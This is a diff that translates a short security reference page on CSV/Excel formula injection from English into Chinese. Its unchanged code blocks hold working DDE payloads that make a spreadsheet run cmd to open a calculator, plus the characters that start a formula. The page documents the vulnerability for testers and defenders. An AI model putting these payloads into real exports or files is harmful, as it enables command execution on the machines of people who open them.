@@ -1,9 +1,9 @@
-# CSV Excel formula injection
-Many web applications allow the user to download content such as templates for invoices or user settings to a CSV file. Many users choose to open the CSV file in either Excel,Libre Office or Open Office. When a web application does not properly validate the contents of the CSV file, it could lead to contents of a cell or many cells being executed.	
+# CSV Excel公式注入
+许多Web应用程序允许用户将诸如发票或者用户设置的模板等内容下载为CSV文件。许多用户使用Excel，Libre Office或者Open Office打开CSV文件。当一个Web应用程序没能正确验证CSV文件的内容时，将导致一个或多个单元格被执行。
 
-## Exploit
+## 攻击
 
-Basic exploit with Dynamic Data Exchange 
+使用动态数据交换的基本攻击：
 ```
 DDE ("cmd";"/C calc";"!A0")A0
 @SUM(1+1)*cmd|' /C calc'!A0
@@ -15,7 +15,7 @@ cmd is the name the server can respond to whenever a client is trying to access 
 
 ```
 
-Any formula can be started with
+任何公式都可以以下列字符开始：
 ```
 =
 +
@@ -23,7 +23,7 @@ Any formula can be started with
 @
 ```
 
-## Thanks to
+## 感谢
 * https://owasp.org/index.php/CSV_Excel_Macro_Injection
 * https://sites.google.com/site/bughunteruniversity/nonvuln/csv-excel-formula-injection
-*https://www.contextis.com/resources/blog/comma-separated-vulnerabilities/
+* https://www.contextis.com/resources/blog/comma-separated-vulnerabilities/
